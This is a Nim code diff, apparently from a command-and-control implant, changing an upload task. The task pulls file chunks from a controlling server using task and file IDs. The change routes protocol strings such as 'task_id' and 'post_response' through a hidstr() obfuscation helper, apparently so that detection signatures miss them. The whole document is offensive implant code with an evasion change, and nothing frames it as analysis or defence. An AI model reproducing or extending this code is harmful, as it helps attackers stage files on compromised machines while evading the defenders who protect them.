@@ -23,17 +23,18 @@ proc uploadExecute(taskId: string, params: JsonNode, state: AgentState,
     var chunkNum    = 1
 
     while true:
-      let msg = %*{
-        "action": "post_response",
-        "responses": [%*{
-          "task_id":   taskId,
-          "upload": {
-            "chunk_num": chunkNum,
-            "file_id":   fileId,
-            "full_path": fullPath,
-          },
-        }],
+      let uploadObj = %*{
+        "chunk_num": chunkNum,
+        "file_id":   fileId,
+        "full_path": fullPath,
       }
+      var innerResp = newJObject()
+      innerResp[hidstr("task_id")] = %taskId
+      innerResp["upload"]           = uploadObj
+
+      var msg = newJObject()
+      msg["action"]    = %hidstr("post_response")
+      msg["responses"] = %[innerResp]
       let resp = send(msg)
       if resp.kind == JNull:
         return TaskResult(
@@ -48,7 +49,7 @@ proc uploadExecute(taskId: string, params: JsonNode, state: AgentState,
 
       let chunkResp = responses[0]
       if chunkNum == 1:
-        totalChunks = chunkResp{"total_chunks"}.getInt(1)
+        totalChunks = chunkResp{hidstr("total_chunks")}.getInt(1)
 
       let chunkData = chunkResp{"chunk_data"}.getStr("")
       if chunkData.len > 0:
